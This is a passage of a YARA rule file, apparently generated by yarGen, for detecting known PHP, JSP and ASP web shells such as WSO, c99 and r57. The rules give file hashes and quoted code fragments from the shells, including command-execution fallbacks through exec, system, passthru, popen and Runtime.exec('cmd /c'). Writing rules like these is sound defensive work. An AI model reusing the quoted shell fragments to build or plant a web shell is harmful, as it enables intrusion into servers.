      $s5 = "@ini_restore(\"safe_mode_include_dir\");" fullword ascii
      $s6 = "@ini_restore(\"open_basedir\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( all of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso_4_2_3_wso_4_2_0_wso_4_2_1_WSO_4_0_5_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_wso_429 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso-4.2.3.php, wso-4.2.0.php, wso-4.2.1.php, WSO_4_0_5.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash3 = "b4c76bead50773295dc09fc006ec5143c7aa3558db7c96cccddb8ab180f8d63b"
      hash4 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash5 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash6 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash7 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash8 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash9 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash10 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = "function actionInfect() {" fullword ascii
      $s2 = "function actionSafeMode() {" fullword ascii
      $s3 = "function perms($p) {" fullword ascii
      $s4 = "function viewSize($s) {" fullword ascii
      $s5 = "function ex($in) {" fullword ascii
      $s6 = "function which($p) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _wso_4_2_4_v4xGus6X_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_1_wso2_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_430 {
   meta:
      description = "webshell - from files wso-4.2.4.php, v4xGus6X.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.1.php, wso2.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
      hash3 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash4 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash5 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash6 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash7 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash8 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash9 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash10 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash11 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
   strings:
      $s1 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\";" fullword ascii
      $s2 = "} elseif (function_exists('shell_exec')) {" fullword ascii
      $s3 = "if (function_exists('exec')) {" fullword ascii
      $s4 = "} elseif (function_exists('system')) {" fullword ascii
      $s5 = "} elseif (function_exists('passthru')) {" fullword ascii
      $s6 = "} elseif (is_resource($f = @popen($in,\"r\"))) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _qyt0dHv1_v4xGus6X_Dx_aioshell_431 {
   meta:
      description = "webshell - from files qyt0dHv1.php, v4xGus6X.php, Dx.php, aioshell.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9507cfcb16c1a7f91c2ec0b93393615e85fb7834c10c58c2f351f0c69bdee285"
      hash2 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
      hash3 = "36f50344183b4bc8b44e64143915ba2c02b9fbf239ce07b8925f849268ee5b3b"
      hash4 = "9211e746ea45d8531d92fa01889b750187deeb41d5400dbd572b6474a1342803"
   strings:
      $s1 = "(($perms & 0x0200) ? 'T' : '-'));" fullword ascii /* Goodware String - occured 1 times */
      $s2 = "(($perms & 0x0400) ? 's' : 'x' ) :" fullword ascii /* Goodware String - occured 1 times */
      $s3 = "(($perms & 0x0200) ? 't' : 'x' ) :" fullword ascii /* Goodware String - occured 1 times */
      $s4 = "(($perms & 0x0800) ? 'S' : '-'));" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "(($perms & 0x0400) ? 'S' : '-'));" fullword ascii /* Goodware String - occured 1 times */
      $s6 = "(($perms & 0x0800) ? 's' : 'x' ) :" fullword ascii /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _c99_PSych0_c66_c99v2_c99shell_c99_w4cking_c99_locus7s_c99_432 {
   meta:
      description = "webshell - from files c99_PSych0.php, c66.php, c99v2.php, c99shell.php, c99_w4cking.php, c99_locus7s.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash3 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash4 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash5 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash6 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash7 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "v = explode(\"=\",$v); $name = urldecode($v[0]); $value = urldecode($v[1]); foreach (array(\"http://\",\"https://\",\"ssl://\"," ascii
      $s2 = "if ($surl_autofill_include and !$_REQUEST[\"c99sh_surl\"]) {$include = \"&\"; foreach (explode(\"&\",getenv(\"QUERY_STRING\")) a" ascii
      $s3 = " if ($act == \"copy\") {$err = \"\"; $sess_data[\"copy\"] = array_merge($sess_data[\"copy\"],$actbox); c99_sess_put($sess_data);" ascii
      $s4 = "} foreach ($sess_data[\"cut\"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data[\"cut\"][$k]);}} c99_sess_put($sess_data)" ascii
      $s5 = "\"\\\\\\\\\") as $needle) {if (strpos($value,$needle) === 0) {$includestr .= urlencode($name).\"=\".urlencode($value).\"&\";}}} " ascii
      $s6 = "     else {echo \"But, you can't connect to forum sql-base, because db-software=\\\"\".$dbms.\"\\\" is not supported by c99shell" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _r57shell_r57_r57_iFX_433 {
   meta:
      description = "webshell - from files r57shell.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash2 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash3 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "$head = '<!-- ??????????  ???? -->" fullword ascii
      $s2 = "/*  ?? ?????? ??????? ????? ?????? ?? ????? ?????: http://rst.void.ru" fullword ascii
      $s3 = "$arrow = \" <font face=Wingdings color=gray>?</font>\";" fullword ascii
      $s4 = "if($GLOBALS['language']==\"ru\"){ $text = '??????! ?? ???? ????????? ???? '; }" fullword ascii
      $s5 = "if($GLOBALS['language']==\"ru\"){ $text = \"?? ??????? ??????? \"; }" fullword ascii
      $s6 = "if($GLOBALS['language']==\"ru\"){ $text = '??????! ?? ???? ???????? ? ???? '; }" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _c66_c99shell_c99_w4cking_Shell__ci___Biz_was_here_c99_locus7s_c99_434 {
   meta:
      description = "webshell - from files c66.php, c99shell.php, c99_w4cking.php, Shell [ci] .Biz was here.php, c99_locus7s.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash3 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash4 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash5 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash6 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "  elseif (is_callable(\"system\") and !in_array(\"system\",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $" ascii
      $s2 = "  elseif (is_callable(\"passthru\") and !in_array(\"passthru\",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($c" ascii
      $s3 = " $result = @ob_get_contents(); @ob_clean(); echo $v;}" fullword ascii
      $s4 = "lt = @ob_get_contents(); @ob_clean(); echo $v;}" fullword ascii
      $s5 = "  if (is_callable(\"exec\") and !in_array(\"exec\",$disablefunc)) {exec($cmd,$result); $result = join(\"\\n\",$result);}" fullword ascii
      $s6 = " global $disablefunc;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _c66_Shell__ci___Biz_was_here_435 {
   meta:
      description = "webshell - from files c66.php, Shell [ci] .Biz was here.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
   strings:
      $s1 = "  bool {break} - if TRUE and found match then break" fullword ascii
      $s2 = " else {echo \"<b>File-System buffer</b><br><br>\"; $ls_arr = $arr; $disp_fullpath = TRUE; $act = \"ls\";}" fullword ascii
      $s3 = "$sort_save = TRUE; //If TRUE then save sorting-position using cookies." fullword ascii
      $s4 = "$usefsbuff = TRUE; //Buffer-function" fullword ascii
      $s5 = "$gzipencode = TRUE; //Encode with gzip?" fullword ascii
      $s6 = "$copy_unset = FALSE; //Remove copied files from buffer after pasting" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _r57_r57_iFX_436 {
   meta:
      description = "webshell - from files r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash2 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "/*  r57shell.php - ?????? ?? ??? ??????????? ??? ????????? ???? ???????  ?? ??????? ????? ???????" fullword ascii
      $s2 = "'ru_text77'=>'???????? ????????? ???? ??????'," fullword ascii
      $s3 = "'ru_text79'=>'?????????? ???????'," fullword ascii
      $s4 = "'ru_text36'=>'????'," fullword ascii
      $s5 = "'ru_text39'=>'???????'," fullword ascii
      $s6 = "'ru_text78'=>'?????????? ???????'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _icesword_job_ma4_ha_2_520_Jspspyweb_ma1_437 {
   meta:
      description = "webshell - from files icesword.jsp, job.jsp, ma4.jsp, ha.jsp, 2.jsp, 520.jsp, Jspspyweb.jsp, ma1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ea0d67b44f2a604603176606bd47cb55845bf29b191564958ce9b9d2a33c63b9"
      hash2 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
      hash3 = "a4306b23c0f066dbfbfc5a06d07b58081dd618fd5c95ec795cd3b8085bc80bd6"
      hash4 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
      hash5 = "11c6a21978abede258a86656ea665773ff5d126975a2389d6514a3f7f25507c1"
      hash6 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
      hash7 = "ae77377b007733bb984ccf751ba2ba26a5befc293a2266ca00d7e53125299947"
      hash8 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
   strings:
      $s1 = "<%@ page import=\"java.nio.charset.Charset\"%>" fullword ascii
      $s2 = "<%@ page import=\"java.util.HashMap\"%>" fullword ascii
      $s3 = "<%@ page import=\"java.util.Map\"%>" fullword ascii
      $s4 = "public String strCut(String str, int len) {" fullword ascii
      $s5 = "<%@ page import=\"java.util.regex.*\"%>" fullword ascii
      $s6 = "\\\");\\n\";" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x213c ) and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _in_leo_jfolder01_jsp_438 {
   meta:
      description = "webshell - from files in.jsp, leo.jsp, jfolder01.jsp, jsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
      hash2 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
      hash3 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
      hash4 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
   strings:
      $x1 = "Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);" fullword ascii
      $s2 = "sb.append(\" <a href=\\\"javascript:doForm('','\"+roots[i]+\"\\\\','','','1','');\\\">\");" fullword ascii
      $s3 = "if(path!=null && !path.endsWith(\"\\\\\")) " fullword ascii
      $s4 = "if(!strDir.endsWith(\"\\\\\"))" fullword ascii
      $s5 = "if(!strDesFile.endsWith(\"\\\\\"))" fullword ascii
      $s6 = "strDesFile=strDesFile+\"\\\\\";" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _in_leo_jfolder01_JFolder_shell1_webshell_nc_jsp_400_439 {
   meta:
      description = "webshell - from files in.jsp, leo.jsp, jfolder01.jsp, JFolder.jsp, shell1.jsp, webshell-nc.jsp, jsp.jsp, 400.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
      hash2 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
      hash3 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
      hash4 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash5 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
      hash6 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
      hash7 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
      hash8 = "7f9280722b4cace28d9abad207c037e723a4e81264de262ab4f537037c10f733"
   strings:
      $s1 = "sbSaveCopy.append(\"<font color=red>" fullword ascii
      $s2 = "sbCopy.append(\"" fullword ascii
      $s3 = "sbSaveCopy.append(\"" fullword ascii
      $s4 = "sbNewFile.append(\"<p><font color=red>" fullword ascii
      $s5 = "sbSaveCopy.append(\"<p><font color=red>" fullword ascii
      $s6 = "if(confirm(\"" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x3c0a ) and filesize < 100KB and ( all of them )
      ) or ( all of them )
}

rule _asp___1__asp__1___2014_10_23_14_54_16_NEW_WebShell__1__asp__1__asp__1_440 {
   meta:
      description = "webshell - from files asp.asp,  (1).asp, asp (1)__2014-10-23-14-54-16.asp, NEW WebShell (1).asp, asp (1).asp, asp (1).asp, .asp, asp.asp, .asp, asp (1)__2014-10-23-14-54-16.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, vps.asp, NEW WebShell.asp,  (1)__2014-10-23-14-54-16.asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash3 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash4 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash5 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash6 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash7 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash8 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash9 = "1816a6e4d41eab4b4a357b94931d238bc089c46d9ec7ae43668b4772a1226e5c"
      hash10 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash11 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash12 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash13 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash14 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
      hash15 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "Set file=fso.getFile(path&fileName)" fullword ascii
      $s2 = "Set app_path=shell.NameSpace(server.mappath(\".\"))" fullword ascii
      $s3 = "Set shell=Server.CreateObject(\"Shell.Application\")" fullword ascii
      $s4 = "app_file.Modifydate=newTime" fullword ascii
      $s5 = "Set app_file=app_path.ParseName(fileName)" fullword ascii
      $s6 = "set ShuXing=request.Form(\"shuxing\")" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _asp_asp__1___2014_10_23_14_54_16_2014_D_____ASP__wt_asp__1____441 {
   meta:
      description = "webshell - from files asp.asp, asp (1)__2014-10-23-14-54-16.asp, 2014.asp, D -  [ASP].asp, wt.asp, asp (1).asp, .asp, 2013.asp, vps.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash3 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash4 = "2838b2bff6e6a4908447291924eabd30eab582b14bb3ac2ac5f3f97851f33cfc"
      hash5 = "b3d59d237cf654294c4be9c4887da8c43c5ad0bef70deeea9aa424f890135cb7"
      hash6 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash7 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash8 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash9 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
   strings:
      $s1 = "filepath = GetFullPath(DirStr)&fso.GettempName" fullword ascii
      $s2 = "</font>]\"&DirStr&\" [<font color=red>\"&Err.Description&\"</font>]<br>\"" fullword ascii
      $s3 = "FSO.CreateTextFile(filepath) " fullword ascii
      $s4 = "if CheckDirIsOKWrite=0 and Deltextfile(filepath)=70 then CheckDirIsOKWrite =1" fullword ascii
      $s5 = "set fout =Nothing" fullword ascii
      $s6 = "if  ShowNoWriteDir and (CheckDirIsOKWrite =70) then" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c or uint16(0) == 0x483c ) and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_NEW_WebShell__1__4_0__1__UnKnown_Vip__1__UnKnown_Vip_NEW__442 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, NEW WebShell (1).asp, 4.0 (1).asp, UnKnown Vip (1).asp, UnKnown Vip.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, _2012.asp, NEW WebShell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash5 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash6 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash7 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash8 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash9 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash10 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash11 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
   strings:
      $s1 = "htaPredloF" fullword ascii /* reversed goodware string 'FolderPath' */
      $s2 = "fI dnE" fullword ascii /* reversed goodware string 'End If' */
      $s3 = "Function ShiSanFun(ShiSanObjstr)" fullword ascii
      $s4 = " If Mid(ShiSanObjstr, ShiSanI, 1) <> \"" fullword ascii
      $s5 = "For ShiSanI = 1 To Len(ShiSanObjstr)" fullword ascii
      $s6 = "\", \"\"\"\")" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule __2014___2012_443 {
   meta:
      description = "webshell - from files _2014.asp, .asp, _2012.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash2 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash3 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
   strings:
      $s1 = "(redloFwohS:tpircsavaj'=ferh a<" fullword ascii
      $s2 = "(redloFwohS:tpircsavaj'=ferh a<> 59=htdiw d=di dt<>rt<>0=redrob elbat<>retnec=ngila " fullword ascii
      $s3 = "gnihtoN=CBA teS:)(revirDwohS.CBA j:FBL weN=CBA teS" fullword ascii
      $s4 = "elifweN\\" fullword ascii
      $s5 = "=ngilav dt<>rt<>rt/<>dt/<>elbat/<" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _NEW_WebShell__1__NEW_WebShell__1___2014_10_23_14_54_16__NEW_WebShell_444 {
   meta:
      description = "webshell - from files NEW WebShell (1).asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, NEW WebShell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash2 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash3 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash4 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
   strings:
      $s1 = "<a href='javascript:ShowFolder(\"\"D:\\\\RECYCLER\\\\\"\")'>D:\\RECYCLER</a>" fullword ascii
      $s2 = "<a href='javascript:ShowFolder(\"\"C:\\\\RECYCLER\\\\\"\")'>C:\\\\RECYCLER</a>" fullword ascii
      $s3 = "If Request(\"Action2\")=\"Post\" Then:Set T=CF.CreateTextFile(Path):T.WriteLine Request.form(\"content\"):T.close:Set T=nothing:" ascii
      $s4 = "If Request(\"Action2\")=\"Post\" Then:Set T=CF.CreateTextFile(Path):T.WriteLine Request.form(\"content\"):T.close:Set T=nothing:" ascii
      $s5 = "enter><br><br><br>" fullword ascii
      $s6 = "</td><td>\":" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _NEW_WebShell__1__UnKnown_Vip__1__UnKnown_Vip_NEW_WebShell__1___2014_10_23_14_54_16_NEW_WebShell_r00t_445 {
   meta:
      description = "webshell - from files NEW WebShell (1).asp, UnKnown Vip (1).asp, UnKnown Vip.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, NEW WebShell.asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash2 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash3 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash4 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash5 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash6 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "Err.number=1" fullword ascii
      $s2 = "FSO.MoveFile Path&\"_bak\",Path" fullword ascii
      $s3 = "If Session(\"FolderPath\")=\"\" Then" fullword ascii
      $s4 = "</center>\" " fullword ascii
      $s5 = "Set C=Nothing" fullword ascii
      $s6 = "Select Case Action" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _NEW_WebShell__1__UnKnown_Vip__1__UnKnown_Vip_NEW_WebShell__1___2014_10_23_14_54_16__NEW_WebShe_446 {
   meta:
      description = "webshell - from files NEW WebShell (1).asp, UnKnown Vip (1).asp, UnKnown Vip.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, NEW WebShell.asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash2 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash3 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash4 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash5 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash6 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash7 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "If theAct = \"releaseFromMdb\" Then" fullword ascii
      $s2 = "showErr(thePath & \" " fullword ascii
      $s3 = "theAct = Request(\"theAct\")" fullword ascii
      $s4 = "If theAct = \"addToMdb\" Then" fullword ascii
      $s5 = "Set files = theFolder.Files" fullword ascii
